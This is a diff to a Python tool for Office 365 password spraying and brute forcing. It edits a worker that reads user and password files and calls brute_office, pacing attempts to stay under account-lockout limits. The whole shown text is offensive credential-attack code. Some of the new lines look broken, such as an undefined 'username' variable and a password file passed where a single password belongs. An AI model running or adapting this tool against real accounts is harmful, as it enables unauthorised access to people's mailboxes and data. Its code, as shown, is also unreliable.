@@ -74,15 +74,12 @@ def check_o365(username):
     isO365 = True
     return isO365
 
-def get_credentials(auth):
-    t = type()
-
 def hybrid_office_worker(policy,user,_pass):
     attempts = 1
     max_attempts, timelimit = tuple(policy.split(','))
     timelimit = 60*int(timelimit)
     max_attempts = int(max_attempts) - 1
-    print(type(user))
+    
     if isinstance(user, str):
         #this shows we are spraying a single username against a passfile
         try:
@@ -108,7 +105,7 @@ def hybrid_office_worker(policy,user,_pass):
                     if attempts == max_attempts:
                         sleep(timelimit)
                         attempts = 1
-                    brute_office(user,password.strip("\n"))
+                    brute_office(username.strip("\n"),_pass)
                     attempts = attempts + 1
                     sleep(timelimit//max_attempts)
         except Exception as e:
@@ -123,12 +120,13 @@ def hybrid_office_worker(policy,user,_pass):
                         if attempts == max_attempts:
                             sleep(timelimit)
                             attempts = 1
-                        #we can try to use threading here
-                        brute_office(user,password.strip("\n"))
+                        
+                        brute_office(username.strip("\n"),password.strip("\n"))
                         attempts = attempts + 1
                         sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
+            exit(0)
 
 def hybrid_smb_worker(policy,username="",password="",userfile="",passfile=""):
     #TODO: Run hybrid bruteforcing here using worker threads
@@ -163,7 +161,7 @@ if __name__ == '__main__':
 
     # Run o365 bruteforce test
     if mode == "o365":
-        print(Fore.BLUE+" Starting Office 365 Password Spraying/Bruteforce")
+        print(Fore.BLUE+"Starting Office 365 Password Spraying/Bruteforce")
         if single_test:
             brute_office(username,password)
         else:
